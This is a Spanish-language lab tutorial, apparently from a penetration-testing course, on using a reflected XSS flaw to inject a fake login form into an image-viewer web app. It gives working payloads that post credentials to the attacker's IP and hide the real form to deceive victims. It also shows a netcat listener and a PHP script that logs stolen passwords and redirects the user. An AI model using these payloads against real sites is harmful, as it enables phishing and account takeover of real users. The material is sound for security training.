# Phishing con XSS

Otro tipo muy común de ataque XSS es el phishing. Estos ataques suelen utilizar información aparentemente legítima para engañar a las víctimas y que envíen su información confidencial al atacante. Una forma común de ataque XSS es inyectar formularios de inicio de sesión falsos que envían los datos de inicio de sesión al servidor del atacante, que luego pueden utilizarse para iniciar sesión en nombre de la víctima y obtener el control de su cuenta e información confidencial.

Además, supongamos que identificamos una vulnerabilidad XSS en una aplicación web de una organización específica. En ese caso, podemos usar dicho ataque como simulación de phishing, lo que también nos ayudará a evaluar el nivel de concienciación en seguridad de los empleados de la organización, especialmente si confían en la aplicación web vulnerable y no prevén que les cause daños.

{% stepper %}
{% step %}
### Descubrimiento XSS

Comenzamos intentando encontrar la vulnerabilidad XSS en la aplicación web desde `/phishing` al servidor al final de esta sección. Al visitar el sitio web, vemos que es un simple visor de imágenes en línea, donde podemos introducir la URL de una imagen y la mostrará:

![Visor de imágenes en línea con el logotipo de Hack The Box.](../../.gitbook/assets/xss_phishing_image_viewer.jpg)

Este tipo de visor de imágenes es común en foros en línea y aplicaciones web similares. Como controlamos la URL, podemos empezar usando la carga útil XSS básica que hemos estado usando. Sin embargo, al probarla, no se ejecuta nada y obtenemos el `dead image url` icono:

![Visor de imágenes en línea con entrada de URL de imagen.](../../.gitbook/assets/xss_phishing_alert.jpg)

Entonces, debemos ejecutar el proceso XSS Discovery que aprendimos previamente para encontrar una carga útil XSS que funcione — "Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page".

{% hint style="info" %}
Consejo: para comprender qué carga útil debería funcionar, intente ver cómo se muestra su entrada en la fuente HTML después de agregarla.
{% endhint %}
{% endstep %}

{% step %}
### Inyección del formulario de inicio de sesión

Una vez que identificamos una carga útil XSS funcional, podemos proceder al ataque de phishing. Para llevar a cabo un ataque de phishing XSS, debemos inyectar un código HTML que muestre un formulario de inicio de sesión en la página objetivo. Este formulario debe enviar la información de inicio de sesión a un servidor en el que estamos escuchando, de modo que, cuando un usuario intente iniciar sesión, obtengamos sus credenciales.

Podemos encontrar fácilmente el código HTML de un formulario de inicio de sesión básico o podemos crear nuestro propio formulario. El siguiente ejemplo debería mostrar un formulario de inicio de sesión:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

En el código HTML anterior, `OUR_IP` es la IP de nuestra máquina virtual, que podemos encontrar con el `ip a` comando en `tun0`. Posteriormente, escucharemos en esta IP para recuperar las credenciales enviadas desde el formulario. El formulario de inicio de sesión debería verse así:

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

A continuación, debemos preparar nuestro código XSS y probarlo en el formulario vulnerable. Para escribir código HTML en la página vulnerable, podemos usar la función JavaScript `document.write()` y usarla en la carga útil XSS que encontramos anteriormente en el paso de Descubrimiento XSS. Una vez que reduzcamos el código HTML a una sola línea y la agreguemos dentro de la `write` función, el código JavaScript final debería ser el siguiente:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Ahora podemos inyectar este código JavaScript usando nuestra carga XSS (es decir, en lugar de ejecutar el `alert(window.origin)` código JavaScript). En este caso, estamos explotando una `Reflected XSS` vulnerabilidad, por lo que podemos copiar la URL y nuestra carga XSS en sus parámetros, como hicimos en la `Reflected XSS` sección anterior, y la página debería verse así al visitar la URL maliciosa:

![Visor de imágenes en línea con campos de entrada de URL de imagen y de inicio de sesión.](../../.gitbook/assets/xss_phishing_injected_login_form.jpg)

{% hint style="warning" %}
No olvide sustituir `OUR_IP` en la carga XSS por su IP real antes de enviar la URL a cualquier objetivo.
{% endhint %}
{% endstep %}

{% step %}
### Limpieza

Podemos ver que el campo URL sigue visible, lo que invalida nuestra línea de "Please login to continue". Por lo tanto, para animar a la víctima a usar el formulario de inicio de sesión, debemos eliminar el campo URL, de modo que piense que debe iniciar sesión para acceder a la página. Para ello, podemos usar la función de JavaScript `document.getElementById().remove()`.

Para encontrar el `id` del elemento HTML que queremos eliminar, podemos abrir el Page Inspector Picker haciendo clic en \[ CTRL+SHIFT+C ] y luego haciendo clic en el elemento que necesitamos:

![Selector del inspector de páginas](../../.gitbook/assets/xss_page_inspector_picker.jpg)

Como vemos tanto en el código fuente como en el texto flotante, el formulario tiene el id `urlform`:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Entonces, ahora podemos usar esta identificación con la `remove()` función para eliminar el formulario URL:

```javascript
document.getElementById('urlform').remove();
```

Ahora, una vez que agregamos este código a nuestro código JavaScript anterior (después de la `document.write` función), podemos usar este nuevo código JavaScript en nuestra carga útil:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Cuando intentamos inyectar nuestro código JavaScript actualizado, vemos que el formulario URL ya no se muestra:

![Visor de imágenes en línea con entrada de URL de imagen y campos de inicio de sesión para nombre de usuario y contraseña.](../../.gitbook/assets/xss_phishing_injected_login_form_2.jpg)

También vemos que aún queda un fragmento del código HTML original después de inyectar el formulario de inicio de sesión. Esto se puede eliminar simplemente comentándolo, añadiendo un comentario HTML de apertura después de la carga XSS:

```html
...PAYLOAD... <!-- 
```

Como podemos ver, esto elimina el fragmento restante del código HTML original y nuestra carga útil debería estar lista. La página ahora parece requerir un inicio de sesión legítimo:

![Visor de imágenes en línea con campos de inicio de sesión de nombre de usuario y contraseña.](../../.gitbook/assets/xss_phishing_injected_login_form_3.jpg)

Ahora podemos copiar la URL final, que debería incluir toda la carga útil, y enviarla a nuestras víctimas para intentar engañarlas para que usen el formulario de inicio de sesión falso. Puedes intentar visitar la URL para asegurarte de que muestre el formulario de inicio de sesión correctamente. También intenta iniciar sesión en el formulario de inicio de sesión anterior y observa qué sucede.
{% endstep %}

{% step %}
### Robo de credenciales

Finalmente, llegamos a la parte donde robamos las credenciales de inicio de sesión cuando la víctima intenta iniciar sesión en nuestro formulario inyectado. Si intentara iniciar sesión en el formulario inyectado, probablemente obtendría el error `This site can’t be reached`. Esto se debe a que, como se mencionó anteriormente, nuestro formulario HTML está diseñado para enviar la solicitud de inicio de sesión a nuestra IP, que debería estar a la espera de una conexión. Si no estamos a la espera de una conexión, obtendríamos un `site can’t be reached` error.

Iniciemos un `netcat` servidor simple y veamos qué tipo de solicitud recibimos cuando alguien intenta iniciar sesión a través del formulario. Para ello, podemos empezar a escuchar en el puerto 80 de nuestra Pwnbox, como se indica a continuación:

```shell-session
OsmanMartinez@htb[/htb]$ sudo nc -lvnp 80
listening on [any] 80 ...
```

Ahora, intentemos iniciar sesión con las credenciales `test:test` y verifiquemos el `netcat` resultado que obtenemos (don't forget to replace OUR\_IP in the XSS payload with your actual IP):

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Como podemos ver, podemos capturar las credenciales en la URL de la solicitud HTTP (`/?username=test&password=test`). Si alguna víctima intenta iniciar sesión con el formulario, obtendremos sus credenciales.

Sin embargo, como solo escuchamos con un `netcat` receptor, este no procesará la solicitud HTTP correctamente y la víctima recibirá un `Unable to connect` error, lo que podría generar sospechas. Por lo tanto, podemos usar un script PHP básico que registre las credenciales de la solicitud HTTP y luego devuelva a la víctima a la página original sin ninguna inyección. En este caso, la víctima podría creer que ha iniciado sesión correctamente y usará el Visor de Imágenes correctamente.

El siguiente script PHP debería hacer lo que necesitamos y lo escribiremos en un archivo en nuestra VM al que llamaremos `index.php` y lo colocaremos en `/tmp/tmpserver/` (don't forget to replace SERVER\_IP with the ip from our exercise):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Ahora que tenemos nuestro `index.php` archivo listo, podemos iniciar un `PHP` servidor de escucha, que podemos usar en lugar del `netcat` oyente básico que usamos anteriormente:

```shell-session
OsmanMartinez@htb[/htb]$ mkdir /tmp/tmpserver
OsmanMartinez@htb[/htb]$ cd /tmp/tmpserver
OsmanMartinez@htb[/htb]$ vi index.php #at this step we wrote our index.php file
OsmanMartinez@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Intentemos iniciar sesión en el formulario de inicio de sesión inyectado y veamos qué pasa. Vemos que nos redirige a la página original del Visor de Imágenes:

![Visor de imágenes en línea con entrada de URL de imagen.](../../.gitbook/assets/xss_image_viewer.jpg)

Si revisamos el `creds.txt` archivo en nuestro Pwnbox, vemos que obtuvimos las credenciales de inicio de sesión:

```shell-session
OsmanMartinez@htb[/htb]$ cat creds.txt
Username: test | Password: test
```

Con todo listo, podemos iniciar nuestro servidor PHP y enviar la URL que incluye nuestro payload XSS a nuestra víctima, y una vez que inicien sesión en el formulario, obtendremos sus credenciales y las usaremos para acceder a sus cuentas.
{% endstep %}
{% endstepper %}
